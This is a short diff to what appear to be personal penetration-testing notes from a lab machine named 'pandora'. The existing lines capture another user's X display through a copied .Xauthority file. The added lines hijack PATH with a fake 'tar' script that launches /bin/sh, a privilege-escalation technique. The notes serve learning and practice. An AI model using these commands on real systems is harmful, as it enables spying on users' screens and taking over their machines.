@@ -22,3 +22,10 @@ Exploit .Xauthority
 > XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0
 > XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > /tmp/0xdf.xwd
 > convert screenshot.xwd screenshot.png
+
+
+Linux_Priv_esc using non absolute executable
+matt@pandora:/tmp$ cat tar
+/bin/sh
+matt@pandora:/tmp$ chmod 777 tar
+matt@pandora:/tmp$ export PATH=/tmp:$PATH
